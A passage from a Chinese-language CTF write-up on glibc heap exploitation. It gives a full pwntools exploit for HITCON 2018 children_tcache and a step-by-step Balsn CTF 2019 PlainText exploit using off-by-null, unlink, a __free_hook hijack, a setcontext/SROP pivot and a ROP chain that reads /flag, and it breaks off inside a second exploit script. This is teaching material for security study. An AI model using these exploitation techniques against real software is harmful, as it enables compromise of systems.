[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-093126.png)

```
creat(sh,0x78 ,'Chunk_1')
delete(sh,0)
delete(sh,2)
creat(sh,0x78,p64(libc.symbols['__free_hook']))
creat(sh,0x78,'Chunk_1')
creat(sh,0x78,p64(libc.address + 0x4f322))
delete(sh,3)
```

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

HITCON_2018_children_tcache=ELF('./HITCON_2018_children_tcache', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./HITCON_2018_children_tcache")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./HITCON_2018_children_tcache")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def creat(sh,chunk_size,value):
    sh.recvuntil('Your choice: ')
    sh.sendline('1')
    sh.recvuntil('Size:')
    sh.sendline(str(chunk_size))
    sh.recvuntil('Data:')
    sh.sendline(value)

def show(sh,index):
    sh.recvuntil('Your choice: ')
    sh.sendline('2')
    sh.recvuntil('Index:')
    sh.sendline(str(index))

def delete(sh,index):
    sh.recvuntil('Your choice: ')
    sh.sendline('3')
    sh.recvuntil('Index:')
    sh.sendline(str(index))

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        creat(sh,0x480,'Chunk_0')
        creat(sh,0x78 ,'Chunk_1')
        creat(sh,0x4F0,'Chunk_2')
        creat(sh,0x20 ,'/bin/shx00')
        delete(sh,0)
        delete(sh,1)
        for i in range(9):
            creat(sh, 0x78 - i, 'A' * (0x78 - i))
            delete(sh,0)
        creat(sh,0x78,'B' * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10))
        delete(sh,2)
        creat(sh,0x480,'Chunk_0')
        show(sh,0)
        libc.address=get_address(sh=sh,info='LIBC ADDRESS --&gt; ',start_string='',end_string='n',offset=0x00007f77c161e000-0x7f77c1a09ca0)
        creat(sh,0x78 ,'Chunk_1')
        delete(sh,0)
        delete(sh,2)
        creat(sh,0x78,p64(libc.symbols['__free_hook']))
        creat(sh,0x78,'Chunk_1')
        creat(sh,0x78,p64(libc.address + 0x4f322))
        delete(sh,3)
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x05 以 Balsn CTF 2019 pwn PlainText 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-121454.png)

保护全开，64位程序，Glibc-2.29

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-122804.png)

存在沙箱，可用的系统调用受到了限制。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-121830.png)

创建新`Chunk`时，存在`Off-by-null`。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

#### <a class="reference-link" name="%E6%B8%85%E7%90%86bin"></a>清理bin

我们在启动程序后查看程序的bin空间，发现里面十分的凌乱

```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7f743c750c40 ─────────────────────
Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x55dab47e4e60, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4700, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4720, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4740, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43d0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e43f0, size=0x20, flags=PREV_INUSE) 
Tcachebins[idx=2, size=0x40] count=7  ←  Chunk(addr=0x55dab47e5270, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4e80, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ff0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ec0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4af0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4c20, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4850, size=0x40, flags=PREV_INUSE) 
Tcachebins[idx=5, size=0x70] count=7  ←  Chunk(addr=0x55dab47e59c0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5b40, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5cc0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5e40, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5fc0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6140, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5730, size=0x70, flags=PREV_INUSE) 
Tcachebins[idx=6, size=0x80] count=7  ←  Chunk(addr=0x55dab47e5920, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5aa0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5c20, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5da0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5f20, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e61b0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e56b0, size=0x80, flags=PREV_INUSE) 
Tcachebins[idx=11, size=0xd0] count=5  ←  Chunk(addr=0x55dab47e5160, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4d90, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e49c0, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4630, size=0xd0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e42e0, size=0xd0, flags=PREV_INUSE) 
Tcachebins[idx=13, size=0xf0] count=6  ←  Chunk(addr=0x55dab47e6030, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4f00, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4760, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4500, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4b30, size=0xf0, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e52f0, size=0xf0, flags=PREV_INUSE) 
────────────────────── Fastbins for arena 0x7f743c750c40 ──────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55dab47e4a90, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ab0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5900, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e59a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5b20, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5ca0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5e20, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5fa0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6120, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e4ad0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e6230, size=0x20, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40]  ←  Chunk(addr=0x55dab47e53e0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5230, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e52b0, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x55dab47e6250, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5550, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5640, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5810, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5eb0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5d30, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5bb0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5a30, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e57a0, size=0x70, flags=PREV_INUSE) 
Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x55dab47e55c0, size=0x80, flags=PREV_INUSE)  ←  Chunk(addr=0x55dab47e5880, size=0x80, flags=PREV_INUSE) 
───────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────── Small Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────── Large Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

那么，为了我们利用的方便，我们先对这些bin进行清理。

```
# Clean Bins
for i in range(7 + 11):
    creat(sh, 0x18 , 'Clean' + 'n')
for i in range(7 + 3):
    creat(sh, 0x38 , 'Clean' + 'n')
for i in range(7 + 9):
    creat(sh, 0x68 , 'Clean' + 'n')
for i in range(7 + 2):
    creat(sh, 0x78 , 'Clean' + 'n')
for i in range(5):
    creat(sh, 0xC8 , 'Clean' + 'n')
for i in range(6):
    creat(sh, 0xE8 , 'Clean' + 'n')
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-140544.png)

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E5%A0%86%E5%B8%83%E5%B1%80%EF%BC%8C%E8%A7%A6%E5%8F%91Unlink"></a>构造堆布局，触发Unlink
<li>首先申请`7`个`0x28`大小的`chunk`用于稍后填满`Tcache`。
<pre><code class="lang-python hljs">for i in range(7):
    creat(sh, 0x28 , 'chunk_' + str(64+i) + 'n')
</code></pre>
</li>
<li>为了我们之后堆布局的方便，我们需要将接下来布局的`chunk`推到`0x?????????????000`的地址上，那么我们首先申请一个探测`Chunk`。
<pre><code class="lang-python hljs">creat(sh, 0x18  , 'Test' + 'n')
</code></pre>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-140621.png)
那么我们需要在此处申请一个`0xBF8`的填充`Chunk`。
<pre><code class="lang-python hljs">creat(sh, 0xBF8  , 'pad' + 'n')
</code></pre>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-141358.png)
</li>
<li>然后申请一个大小为`0x5E0`的`Chunk`和一个`0x18`大小的`Chunk`，这个`0x18`大小的`Chunk`是为了稍后释放`0x5E0`的`Chunk`时防止其被`Top Chunk`所吞并，释放大小为`0x5E0`的`Chunk`，现在，`Unsorted bin`中有一个`0x5F0`大小的`Chunk`，然后申请一个`0x618`大小的`Chunk`，`Unsorted bin`中的`0x5F0`大小的`Chunk`将会被加入`Large bin`。
<pre><code class="lang-python hljs">creat(sh, 0x5E0 , 'chunk_72' + 'n') 
creat(sh, 0x18  , 'chunk_73' + 'n')
delete(sh,72)
creat(sh, 0x618 , 'chunk_72' + 'n')
</code></pre>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-141826.png)
</li>
<li>接下来，申请一个`0x28`大小的`Chunk 0`，内部布置成一个`fake chunk`，`fake chunk`位于`Chunk 0 + 0x10`
<pre><code class="lang-python hljs">creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))
</code></pre>
⚠️：此时我们是从`Large_bin`中分割了`0x28`大小的内存，于是此`Chunk`中必定残留了我们所需要的`fd_nextsize`信息。分割剩余的`0x5C0`大小的`Chunk`将会被被加入`Unsorted bin`中。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-141954.png)
</li>
<li>接下来我们再申请`4`个`0x28`大小的`Chunk`用于后续构造，这里将它们命名成`Chunk 1 ~ Chunk 4`。
<pre><code class="lang-python hljs">creat(sh, 0x28  , 'chunk_75' + 'n')
creat(sh, 0x28  , 'chunk_76' + 'n')
creat(sh, 0x28  , 'chunk_77' + 'n')
creat(sh, 0x28  , 'chunk_78' + 'n')
</code></pre>
</li>
<li>然后我们先将`0x28`大小的`Tcache`填满。
<pre><code class="lang-python hljs">for i in range(7):
    delete(sh, 64 + i)
</code></pre>
</li>
<li>释放`Chunk 1`和`Chunk 3`，这两个`Chunk`将会被加入`Fastbin`，现在有：`Fastbin &lt;- Chunk 1 &lt;- Chunk 3`。
<pre><code class="lang-python hljs">delete(sh, 75)
delete(sh, 77)
</code></pre>
</li>
<li>接下来先将`0x28`大小的`Tcache`清空。
<pre><code class="lang-python hljs">for i in range(7):
    creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')
</code></pre>
</li>
<li>然后申请一个`0x618`大小的`Chunk`，此时`Unsorted bin`中的`0x500`大小的`Chunk`将会被加入`Largebin`
<pre><code class="lang-python hljs">creat(sh, 0x618 , 'chunk_75' + 'n')
</code></pre>
</li>
<li>将`Chunk 1`和`Chunk 3`取回，利用`Chunk 3`上残留的`bk`信息构造`Chunk 3 -&gt; bk = Chunk 0 + 0x10 = fake_chunk`。
<pre><code class="lang-python hljs">creat(sh, 0x28  , 'b' * 8 + p8(0x10))
creat(sh, 0x28  , 'chunk_1')
</code></pre>
</li>
<li>然后我们先将`0x28`大小的`Tcache`填满。
<pre><code class="lang-python hljs">for i in range(7):
    delete(sh, 64 + i)
</code></pre>
</li>
<li>释放`Chunk 4`和`Chunk 0`，这两个`Chunk`将会被加入`Fastbin`，现在有：`Fastbin &lt;- Chunk 4 &lt;- Chunk 0`。
<pre><code class="lang-python hljs">delete(sh, 78)
delete(sh, 74)
</code></pre>
</li>
<li>接下来先将`0x28`大小的`Tcache`清空。
<pre><code class="lang-python hljs">for i in range(7):
    creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')
</code></pre>
</li>
<li>将`Chunk 0`和`Chunk 4`取回，利用`chunk 0`上残留的`fd`信息构造`Chunk 0 -&gt; fd = Chunk 0 + 0x10 = fake_chunk`，并通过`Chunk 4`伪造`Chunk 5`的`prev_size`域，进而触发`off-by-null`。
<pre><code class="lang-python hljs">creat(sh, 0x28  , p8(0x10))
creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))
</code></pre>
</li>
<li>从`Large bin`中取回其中大小为`0x500`的`chunk`
<pre><code class="lang-python hljs">creat(sh, 0x4F8  , 'n')
</code></pre>
至此，我们的所有布置结束，我们来查看一下此时的堆布局：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-143419.png)
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-143957.png)
</li>
<li>现在我们释放`chunk 5`，触发向后合并。
<ol>
1. 对于`2.29`新增的保护`__glibc_unlikely (chunksize(p) != prevsize)`，取出`Chunk 5`的`prev_size`为`0xE0`，然后`p = p - 0xE0`，恰好移动到了`fake_chunk`处，它的`size`恰好为`0xE0`，保护通过。
1. 对于`2.27`新增的保护`chunksize (p) != prev_size (next_chunk (p))`，根据`0xE0`找到`next_chunk`为`Chunk 5`，验证`Chunk 5`的`prev_size`与`fake_chunk`的`size`相等，均为`0xE0`，保护通过。
1. 对于`2.23`就已经存在的保护`__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0)`，`fake_chunk -&gt; fd`指向`Chunk 3`，之前已伪造`Chunk 3 -&gt; bk = Chunk 0 + 0x10 = fake_chunk`，`fake_chunk -&gt; bk`指向`Chunk 0`，之前已伪造`Chunk 0 -&gt; fd = Chunk 0 + 0x10 = fake_chunk`，保护通过。
```
delete(sh, 79)
```

至此，我们已经成功的构造了`Heap Overlap`。

但是正如我们所见，我们必须保证`heap`地址是`0x????????????0???`，那么，我们的成功率只有`1/16`。

#### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"></a>泄露信息

接下来我们进行信息泄露，我们申请一个`0x18`大小的`Chunk`，将`libc`地址推到`chunk 1`的位置,直接查看`chunk 1`的内容即可获取`libc`基址。

```
#Leak info
creat(sh, 0x18 , 'n')
show(sh,79)
libc.address = get_address(sh=sh,info='LIBC_ADDRESS --&gt; ',start_string='',end_string='n',offset=0x7f30e85f4000-0x7f30e87d8ca0)
```

然后我们继续泄露堆地址，首先申请一个`0x38`大小的`chunk`，现在我们拥有两个指向`chunk 1`位置的指针，首先选取之前为了清理`bin`而申请的一个`0x38`大小的`chunk`，释放，然后释放一次`chunk 1`，使用另一个指针直接查看`chunk 1`的内容即可获取`heap`基址。

```
creat(sh, 0x38 , 'n')
delete(sh, 18)
delete(sh, 81)
show(sh,79)
heap_address = get__address(sh=sh,info='HEAP_ADDRESS --&gt; ',start_string='',end_string='n',offset=-0x1270)
```

#### 劫持`__free_hook`，控制执行流(RIP)

首先申请一个`0x18`大小的`Chunk`，那个`Chunk`将位于`Chunk 1 + 0x10`，然后将其释放，再将之前申请的`Chunk 1`释放再取回，现在，我们可以操纵位于`Chunk 1 + 0x10`的所有域，于是我们达成任意地址读写，借助`__free_hook`可以直接升级为任意代码跳转。

```
creat(sh, 0x18 , 'n')
delete(sh, 18)
delete(sh, 76)
creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
creat(sh, 0x18 , 'n')
creat(sh, 0x18 , p64(0xDEADBEEF))
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-11-154803.png)

#### <a class="reference-link" name="%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"></a>沙箱绕过

首先我们有一个较为直接的思路是利用某种方式进行栈迁移，将`rsp`迁移到`heap`上，然后在`heap`上构造`ROP`链，进而完成利用。

这里我们需要先介绍`setcontext`函数。

函数原型：`int setcontext(const ucontext_t *ucp);`

这个函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流

以下代码是其在`Glibc 2.29`的实现

```
.text:0000000000055E00                 public setcontext ; weak
.text:0000000000055E00 setcontext      proc near ; CODE XREF: .text:000000000005C16C↓p
.text:0000000000055E00                           ; DATA XREF: LOAD:000000000000C6D8↑o
.text:0000000000055E00                 push    rdi
.text:0000000000055E01                 lea     rsi, [rdi+128h]
.text:0000000000055E08                 xor     edx, edx
.text:0000000000055E0A                 mov     edi, 2
.text:0000000000055E0F                 mov     r10d, 8
.text:0000000000055E15                 mov     eax, 0Eh
.text:0000000000055E1A                 syscall                 ; $!
.text:0000000000055E1C                 pop     rdx
.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000055E23                 jnb     short loc_55E80
.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
.text:0000000000055E2C                 fldenv  byte ptr [rcx]
.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E7D                 xor     eax, eax
.text:0000000000055E7F                 retn
```

根据此处的汇编可以看出，我们如果可以劫持`RDX`，我们就可以间接控制`RSP`，但我们通过劫持`__free_hook`来实现任意代码执行时，我们事实上只能劫持第一个参数也就是`RDI`。

而我们在`libc`中恰好可以找到一个好用的`gadget`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-032651.png)

⚠️：此`gadget`无法通过`ROPgadget`找到，请使用`ropper`来代替查找。

那么我们接下来布置`ROP`链即可:

```
# SROP chain
frame = SigreturnFrame()
frame.rdi = heap_address + 0x30A0 + 0x100 + 0x100
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = heap_address + 0x30a0 + 0x100
frame.rip = libc.address + 0x000000000002535f # : ret
frame.set_regvalue('&amp;fpstate', heap_address)
str_frame = str(frame)

payload = p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address + 0x30A0) + str_frame[0x10:]

# ROP chain
layout = [
    # sys_open("./flag", 0)
    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
    2,
    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
    # sys_read(flag_fd, heap, 0x100)
    libc.address + 0x0000000000026542, #: pop rdi; ret; 
    3, # maybe it is 2
    libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_address + 0x10000,
    libc.address + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
    0,
    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
    # sys_write(1, heap, 0x100)
    libc.address + 0x0000000000026542, #: pop rdi; ret; 
    1,
    libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_address + 0x10000,
    libc.address + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
    1,
    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
    # exit(0)
    libc.address + 0x0000000000026542, #: pop rdi; ret; 
    0,
    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
    231,
    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
]
payload = payload.ljust(0x100, '') + flat(layout)
payload = payload.ljust(0x200, '') + '/flag'
```

最后我们直接触发即可

```
add(0x300, payload)
delete(56)
```

我们来简单分析一下我们的利用链：
<li>首先我们调用`free`后，流程会自动跳转至:
<pre><code class="lang-asm">mov rdx, qword ptr [rdi + 8]
mov rax, qword ptr [rdi]
mov rdi, rdx
jmp rax
</code></pre>
我们传入的`[rdi]`是`p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address + 0x30A0)`
</li>
1. 那么我们执行到`jmp rax`时，寄存器状况为`rax = libc.symbols['setcontext'] + 0x1d , rdx = heap_address + 0x30A0`，程序跳转执行`libc.symbols['setcontext'] + 0x1d`。
<li>接下来将我们实现布置好的信息转移到对应寄存器内，栈迁移完成。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-061140.png)
</li>
<li>最后程序将执行我们的ROP链，利用结束。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-061532.png)
</li>
### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

plain_note=ELF('./plain_note', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

